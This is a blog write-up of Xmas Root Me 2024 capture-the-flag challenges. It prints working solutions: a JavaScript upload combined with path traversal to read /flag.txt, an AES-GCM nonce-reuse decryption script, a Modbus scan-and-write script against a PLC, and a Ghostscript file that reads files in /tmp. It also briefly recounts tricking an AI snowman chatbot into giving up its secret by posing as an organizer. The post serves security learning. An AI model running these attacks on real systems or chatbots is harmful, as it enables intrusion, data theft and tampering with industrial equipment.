---
layout: post
title: "XMas Root Me 2024"
author: cryptax
date: 2025-01-14
tags:
- rootme
- 2024
- ctf
- javascript
- path traversal
- AI
- crypto
- OSINT
- modbus
- ghostscript
---

# Xmas Root Me CTF 2024

## Generous Santa (Day 1) - Web

This is a web challenge. We are given a Docker environment to test locally, and then have our own instance online to retrieve the flag.

We can upload photos of potential gifts and then select what we'd like Santa to bring us.
Inspection of the source code of the website shows:

1. The code does not check we upload a photo. (`api/suggest`)
2. Directory traversal when selecting a gift. (`api/add`)

So, the hack consists in uploading a javascript file as a picture via `api/suggest`. This "picture" is stored in a directory whose name is supplied in the answer of the suggest API.
Then, we *execute* the javascript by adding it as a selected gift. Our Javascript reads the flag, and returns it as the message of an exception.

```javascript
const fs = require('fs');

const readFileSync = (filePath) => {
    try {
      const data = fs.readFileSync(filePath, 'utf8'); // Lecture synchrone
      return data; // Retourne le contenu du fichier
    } catch (err) {
      throw new Error(`Erreur lors de la lecture du fichier : ${err.message}`);
    }
};

const throwExceptionWithFileContent = (filePath) => {
    try {
      const fileContent = fs.readFileSync(filePath, 'utf8'); // Lecture synchrone du fichier
      throw new Error(fileContent); // Lève une exception avec le contenu du fichier comme message
    } catch (err) {
      console.error(`Une exception a été levée : ${err.message}`);
      throw err; // Optionnel : relancer l'exception pour qu'elle soit traitée plus haut
    }
  };

const mongoose = require('/usr/app/node_modules/mongoose');


const picoSchema = new mongoose.Schema({
    name: { type: String, default: () => 'Pico est beau' },
    description: { type: String, default: 'Pico est un croco' }
});


picoSchema.methods.store = function() {
    console.log('Pico est mega beau');
    throwExceptionWithFileContent('/flag.txt');
    return this;
};

module.exports = mongoose.model('Pico', picoSchema);
```

To retrieve the flag: 

```
$ curl -s -X POST -F "name=pico" -F "photo=@pico.js" http://XMAS-ROOT-ME-INSTANCE/api/suggest 2>&1 | grep -o '"photoPath":"[^"]*"' | sed 's/"photoPath":"\(.*\)"/\1/' | xargs -I{} curl 'http://XMAS-ROOT-ME-INSTANCE/api/add' -X POST -H 'Content-Type: application/json' --data-raw '{"product":"../../../../..//{}"}
./attack.sh
{"message":"Error adding the product ../../../../..///tmp/2024-12-09_18-1-58/pico.js. The flag is : \n\nRM{Mayb3_S4nt4_Cl4uS_Als0_G3t_A_Flag}"}
```


## Wrapped Packet - Day 2 - Pcap

We are given a pcapng file and are told data is exfiltrated.
We notice unusually long data in ICMP packets:

```
5b2d02000000000034353732373236663732336132303730343537323732366637323361323037303435373237323666
5b2d02000000000034353732373236663732336132303730343537323732366637323361323037303435373237323666
```

With the help of ChatGPT, I write a script to extract all payloads of ICMP packets:

```python
import pyshark

def extract_icmp_data(pcap_file):
    """
    Extracts ICMP packet data from a PCAP file.

    Args:
        pcap_file (str): Path to the PCAP file.
    """
    # Filter for ICMP packets
    capture = pyshark.FileCapture(pcap_file, display_filter="icmp")
    
    print(f"Extracting ICMP data from {pcap_file}...\n")
    
    try:
        for packet in capture:
            # Extract IP layer details
            src_ip = packet.ip.src
            dst_ip = packet.ip.dst

            # Extract ICMP layer details
            icmp_type = packet.icmp.type
            icmp_code = packet.icmp.code
            icmp_info = packet.icmp.info if hasattr(packet.icmp, "info") else "No info"
            
            # Display payload if available
            payload = packet.icmp.get("data", "No Payload")
            
            #print(f"Packet:")
            #print(f"  Source IP: {src_ip}")
            #print(f"  Destination IP: {dst_ip}")
            #print(f"  ICMP Type: {icmp_type}")
            #print(f"  ICMP Code: {icmp_code}")
            #print(f"  ICMP Info: {icmp_info}")
            print(f"{payload}")
    except KeyboardInterrupt:
        print("Extraction stopped by user.")
    finally:
        capture.close()

# Update with the path to your PCAP file
pcap_path = "chall.pcapng"
extract_icmp_data(pcap_path)
```

Several packets look like they have encoded ASCII characters. So, I write a script to print that:

```python
import binascii

def read_payloads(file_path):
    try:
        with open(file_path, "r") as file:
            payloads = [line.strip() for line in file if line.strip()]
        return payloads
    except FileNotFoundError:
        print(f"Error: File {file_path} not found.")
        return []
    
def decode_hex(payload):
    try:
        # Convert hex to ASCII
        ascii_data = binascii.unhexlify(payload).decode('ascii')
        return ascii_data
    except Exception as e:
        find_non_hex_characters(payload)
        return f"Error decoding: {e}"

def find_non_hex_characters(hex_string):
    non_hex_chars = []
    for index, char in enumerate(hex_string):
        if char not in "0123456789abcdefABCDEF":
            non_hex_chars.append((index, char))
    
    if non_hex_chars:
        print("Non-hexadecimal characters found:")
        for pos, char in non_hex_chars:
            print(f"  Position {pos}: {repr(char)} (Unicode: {ord(char)})")
        return "Invalid hex string due to non-hex characters."
    else:
        print("No non-hexadecimal characters found.")
        return hex_string



def analyze_payloads(payloads):
    for payload in payloads:
        header = payload[:8]
        data = payload[8:]
        ascii_data = decode_hex(data).replace('\x00','')
        
        #print(f"Payload: {payload}")
        #print(f"  Header: {header}")
        #print(f"  Data (hex): {data}")
        print(f"{ascii_data} --> {decode_hex(ascii_data.strip())}")
        #print()

payloads = read_payloads('payloads-icmp.txt')
analyze_payloads(payloads)
```

When we run the script, we get the flag. The information is repeated, but we can easily work out `RM{M3rry_Chr1stM4s_R00T-M3}`.

```
48657920796f752048657920796f752048657920 --> Hey you Hey you Hey 
48657920796f752048657920796f752048657920 --> Hey you Hey you Hey 
666f756e64206d65666f756e64206d65666f756e --> found mefound mefoun
666f756e64206d65666f756e64206d65666f756e --> found mefound mefoun
212057656c6c2064212057656c6c206421205765 --> ! Well d! Well d! We
212057656c6c2064212057656c6c206421205765 --> ! Well d! Well d! We
6f6e65216f6e65216f6e6521 --> one!one!one!
6f6e65216f6e65216f6e6521 --> one!one!one!
524d7b4d33727279524d7b4d33727279524d7b4d --> RM{M3rryRM{M3rryRM{M
524d7b4d33727279524d7b4d33727279524d7b4d --> RM{M3rryRM{M3rryRM{M
5f4368723173744d5f4368723173744d5f436872 --> _Chr1stM_Chr1stM_Chr
5f4368723173744d5f4368723173744d5f436872 --> _Chr1stM_Chr1stM_Chr
34735f523030542d34735f523030542d34735f52 --> 4s_R00T-4s_R00T-4s_R
4d337d0a4d337d0a4d337d0a --> M3}
M3}
M3}
```

## Santa's Magic Sack - Day 3 - Debug JS

This is a game hacking challenge, where we need to upload a high score for our identifier.

In the javascript source code, we notice the key `Ud = "S4NT4_S3CR3T_K3Y_T0_ENCRYPT_DATA"`. Apparently, function `Wd` sends a score to the scoreboard. The player name, score, checksum and salt are encrypted using AES and the secret key. 

The idea is to manage to submit our own score for my player (Pico). But the salt and encryption must be valid. To do that, we use developer tools, place a breakpoint in the function `Vd` that calls `Wd`, and issue our own crafted `Vd("pico", 1333337)`.

![](/images/xmas2024-debugger-vd.png)
![](/images/xmas2024-flag-vd.png)

We get the flag.

## The Friendly Snowman - Day 5 - AI

This is an AI challenge. Users can ask questions to a friendly snowman, and we need to trick him to give the flag.

I simply tricked the snowman by telling him I was a root me organizer.

![](/images/xmas2024-snowman.png)

## Unwrap the Gift - Day 6 - Crypto

A remote host runs a wrapping service for Santa. 

```
--------------------------------------------------
  .-""-.
 /,..___\
() {_____}
  (/-@-@-\)
  {`-=^=-'}
  {  `-'  } Oh Oh Oh! Merry Root-Xmas to you!
   {     }
    `---'
--------------------------------------------------
 Hello player, welcome! Here is your gift for this christmas: ec1d3ab634bd72e1ac9b570ee7db3c170e5e4353a51c139dde9fff82cd491231b55f54d5b01110ad773c9bfcb9c1dfaf4f198317aa5ee3461efe74e11c683e35
 [SANTA]: Oh, I forgot to tell you, you will only be able to unwrap it on the 25th, come back to me on that date to get the key!
 [SANTA]: While I'm at it, do you wish to wrap a present for someone? (Y/N)
```

We are given the Python program with a redacted flag.

```python
FLAG = environ.get('FLAG', 'RM{REDACTED_FAKE_FLAG_DONT_SUBMIT}')
```

The program uses AES GCM (mode 6):

```python
class Gift:
... 
    def wrap(self, data):
        """
        Wrap the data with strong AES encryption
        """
        cipher = AES.new(self.key, 6, nonce=self.iv)
        data = data.encode()
        return hexlify(cipher.encrypt(pad(data, 16))).decode()
```

The vulnerability lies in the fact that the IV is reused for the second gift wrap:

```python
class Gift:
    """
    A custom class to wrap and unwrap gifts
    """
    def __init__(self):
        self.key = urandom(16)
        self.iv = urandom(12)
    ...

if __name__ == '__main__':
    ...

    gift = Gift()
    
    santa_says(f"Hello player, welcome! Here is your gift for this christmas: {gift.wrap(FLAG)}")

    ...

    santa_says("While I'm at it, do you wish to wrap a present for someone? (Y/N)")
  ...
        santa_says(f"Here is your wrapped present: {gift.wrap(message)}")
```

GCM works as follows: the plaintext is XORed with the encrypted result of a counter with a key. The counter is incremented for each block. For the first block, it is initialized with the concatenation of the Init Vector IV and counter 1. So, for the first block we have something like `C = E(K, (IV||1)) xor P` etc.

Let's call Cf the ciphertext of our Xmas gift (which contains the flag Pf).
Let's call Cg the ciphertext of another gift Pg we want to wrap.

If the IV is re-used, we have the same counter stream:

```
Cf xor Cg = E(K, (same-counter)) xor Pf xor E(K, (same-counter)) xor Pg
= Pf xor Pg
```

Which means that we can compute Pf:

```
Pf = Pg xor (Cg xor Cf)
```

This is precisely what we implement. We read `Cf` from the server's answer, and we ask it to wrap a gift Pg which contains only `A`s. The server returns `Cg`, and we compute `Pf` from our formula.

```python
import socket
from binascii import unhexlify, hexlify

def xor_bytes(a, b):
    """Effectue le XOR entre deux chaînes de bytes."""
    return bytes([x ^ y for x, y in zip(a, b)])

HOST = "ROOT-ME-SERVER"
PORT = ROOT-ME-PORT

# We select a dummy Pg - adapt length to be able to read the entire Pf
plaintext = "A" * 128  

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    
    # Read welcome message and extract Cf
    data = s.recv(4096).decode()
    print(f'data={data}')
    flag_ciphertext = data.split(":")[2][1:-8]
    print(f"Ciphertext du FLAG : {flag_ciphertext}")
    print(f'len={len(flag_ciphertext)}')
    
    # Interact to ask to wrap Pg
    s.sendall(b"Y\n") 
    response = s.recv(4096).decode()
    print(response)
    
    s.sendall(f"{plaintext}\n".encode())  
    response = s.recv(4096).decode()
    print(response)
    
    # Extract Cg
    known_ciphertext = response.split(":")[-2][1:-8]
    print(f"Ciphertext connu : {known_ciphertext}")

# Compute Pf
cipher_flag = unhexlify(flag_ciphertext)
cipher_known = unhexlify(known_ciphertext)
plaintext_bytes = plaintext.encode()

recovered_flag = xor_bytes(plaintext_bytes, xor_bytes(cipher_flag, cipher_known))
print("FLAG retrouvé :", recovered_flag.decode())
```

The result is `b'RM{D0NT_WR4P_YOUR_GIFTS_W1TH_W3AK_CRYPTOGRAPHY:(}\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'`

> Quite funny: I had myself written a CTF challenge several years ago based on the same issue, but  for AES-CTF.

## The lost gift - Day 13 (OSINT)

*This challenge was done with Ludoze*

This is an OSINT challenge. The challenge description says they have lost control of their FPV drone. They have beacon pcap traces, and the last picture it took. We need to find the drone by supplying the name of the street where it is.

I ask ChatGPT to extract GPS coordinates from the pcap and place them on a map. From that map, we see where the drone was going and try to find an intersection in that direction that looks like the photo we have. 

We quickly identify Clos de la Terre Rouge, but struggle to enter the correct flag for a long time... `RM{closdelaterrerouge}`, we thought we need to find a *street* name.

## Coil Under the Tree - Day 16 (OT)

This is an original industrial challenge. We are told we are connected to an internal plant from which we must extract information from the PLCs.

Our task is: 

1. Scan and find a valid slave ID
2. Edit its holding register at address 0x10 with value 0xff
3. Read input registers to get info. We are told we need to be quick because we only have 5 secs to read after edition.

We don't know what type of PLC we are talking to, so we will just use Modbus.

We connect to the remote host/port, and try to read coils or holding registers for slaves from 0 to 255. If we manage to get answers for a given slave, we know this slave is up and running.

```python
from pymodbus.client import ModbusTcpClient
from pymodbus import ModbusException, pymodbus_apply_logging_config
import time

pymodbus_apply_logging_config("ERROR")

def find_valid_slave_ids(ip, port=10016, max_slave_id=255):
    valid_slaves = []
    for slave_id in range(max_slave_id + 1):
        client = ModbusTcpClient(ip, port=port)
        client.connect()
    
        try:
            rr = client.read_coils(1, count=1, slave=slave_id)
        except ModbusException as exc:
            client.close()
            continue

        if rr.isError():
            client.close()
            continue

        try:
            rr = client.read_holding_registers(10, count=2, slave=slave_id)
        except ModbusException as exc:
            client.close()
            continue
        if rr.isError():
            client.close()
            continue
        else:
            print(f'Slave={slave_id} found! Holding Register.')
            valid_slaves.append(slave_id)
        
        try:
            rr = client.read_input_registers(address=0, count=1, slave=slave_id)
        except ModbusException as exc:
            client.close()
            continue
        if rr.isError():
            client.close()
            continue
        else:
            print(f'Slave={slave_id} found! Input register.')
            valid_slaves.append(slave_id)

    time.sleep(0.1)
    return valid_slaves

ip = 'ROOT-ME-HOST'
port = 10016

found_slaves = find_valid_slave_ids(ip, port)

print("\nSummary:")
if found_slaves:
    print(f"Slave IDs: {found_slaves}")
else:
    print("No slaves?")
```    

When we run the script, we find that slave id 105 is up:

```
$ python3 scan.py 
Slave=105 found! Holding Register.
Slave=105 found! Input register.

Summary:
Slave IDs: [105, 105]
```

Now, we just need to do what we were told.
First edit the holding register of slave 105 with value 0xff.

```python
  try:
        print(f'Writing holding register at slave Id={slave_id}...')
        rr = client.write_register(address=0x10, value=0xff, slave=slave_id)
```

Then, read input registers to get some secret info. 
We don't know at what address we'll have info, so we read all adresses, by chunks of 125 and print when there's some info in them.

```python
address = 0
increment = 125
while address < 1000:
  try:
    print(f'Reading input registers address={address} for slave={slave_id}...')
    rr = client.read_input_registers(address=address, count=increment, slave=slave_id)
  except ModbusException as exc:
    ...
  if rr.isError():
    # handle error
  else:
    # Read info
    for offset, value in enumerate(rr.registers):
      if value != 0:
        print(f"Address 0x{(address + offset):02X}: {value} (Decimal) / 0x{value:02X} (Hex)")
  # loop
  address = address + increment
```

We get the following output:

```
[+] Connected at 163.172.68.42:10016
Writing holding register at slave Id=105...
[+] Write with success. rr=WriteSingleRegisterResponse(dev_id=105, transaction_id=1, address=16, count=0, bits=[], registers=[255], status=1)
Reading input registers address=0 for slave=105...
Address 0x00: 81 (Decimal) / 0x51 (Hex)
Address 0x01: 50 (Decimal) / 0x32 (Hex)
Address 0x02: 57 (Decimal) / 0x39 (Hex)
Address 0x03: 117 (Decimal) / 0x75 (Hex)
Address 0x04: 90 (Decimal) / 0x5A (Hex)
Address 0x05: 51 (Decimal) / 0x33 (Hex)
Address 0x06: 74 (Decimal) / 0x4A (Hex)
```

I provide the hexadecimal data to Claude AI, and tell it it's very probably a string, character by character.
We get a Base64 encoded string, and decode it to get the flag.

![](/images/xmas2024-ot.png)

## Ghost in the shell - Day 17 (Ghostscript)

We are told that Santa has set up a PDF creation service.
It's old school and works as follows: you supply a .gs file to a remote root-me server/port and the service answers with the PDF in base64.

We are told there is a flag in `/tmp/flag-<RANDOM>.txt`
So, we need to craft a ghostscript file that can read files in `/tmp`, and then show the content of that flag file. [This blog post is helpful to understand how to craft the Ghostscript file](https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation)


For each file in `/tmp`, we call `showfilename`:

```postscript
% Use filenameforall to list files in /tmp
(/tmp/*) { showfilename } 1024 string filenameforall
```

Then, in `showfilename` we simply display the filename:

```postscript
% Define a procedure to show filenames
/showfilename {
    /Helvetica findfont 10 scalefont setfont
    100 posY moveto
    show
    /posY posY 20 sub def % Move down for the next filename
} def
```

We run the script once and find there is an interesting flag file: `/tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt`

We edit our script to show the contents of the file. 

> Note that I was actually surprised this gave the flag, I would have thought the flag file to have a different name at each run, but it wasn't the case.

```postscript
(/tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt)
 (r) file 1024 string readstring
```

This is the full script:

```postscript
%!PS
/Helvetica findfont 12 scalefont setfont
100 700 moveto

(Hello, world merry Christmas) show
100 680 moveto

% Set up initial position for file listing
/posY 660 def

% Define a procedure to show filenames
/showfilename {
    /Helvetica findfont 10 scalefont setfont
    100 posY moveto
    show
    /posY posY 20 sub def % Move down for the next filename
} def

% Use filenameforall to list files in /tmp
(/tmp/*) { showfilename } 1024 string filenameforall

(/tmp/flag-9fb215456edeadc855c755846be83cc310a5d262aa5d9360dd27db9cd0141a9d.txt)
 (r) file 1024 string readstring

string readstring exch pop 
show

showpage
```

We send the ghostscript file and get the flag.

```
$ cat hello.gs | socat - TCP:ROOT_ME_SERVER
GPL Ghostscript 9.53.3 (2020-10-01)
Copyright (C) 2020 Artifex Software, Inc.  All rights reserved.
This software is supplied under the GNU AGPLv3 and comes with NO WARRANTY:
see the file COPYING for details.
Loading NimbusSans-Regular font from /usr/share/ghostscript/9.53.3/Resource/Font/NimbusSans-Regular... 5014808 3478888 1914352 627166 1 done.
Error: /typecheck in --string--
Operand stack:
   (RM{Gh0Scr1pt_c4n_d0_THIS??}\n)   false
Execution stack:
   %interp_exit   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--   --nostringval--   --nostringval--   false   1   %stopped_push   1990   1   3   %oparray_pop   1989   1   3   %oparray_pop   1977   1   3   %oparray_pop   1833   1   3   %oparray_pop   --nostringval--   %errorexec_pop   .runexec2   --nostringval--   --nostringval--   --nostringval--   2   %stopped_push   --nostringval--
Dictionary stack:
   --dict:731/1123(ro)(G)--   --dict:0/20(G)--   --dict:77/200(L)--
Current allocation mode is local
Current file position is 586
Erreur lors de la conversion en PDF.
```

> Very interesting and original challenge. Made me learn on Ghostscript.

## Conclusion

I didn't have time (nor skills) to look in all challenges. I enjoyed the Xmas Root Me challenges for many reasons: *interesting to solve, different tricks and topics.* 

Perhaps I would have appreciated a growing difficulty, i.e very easy challenges for the first days, and more and more difficult when days pass. It wasn't the case: difficulty wasn't related to the day. 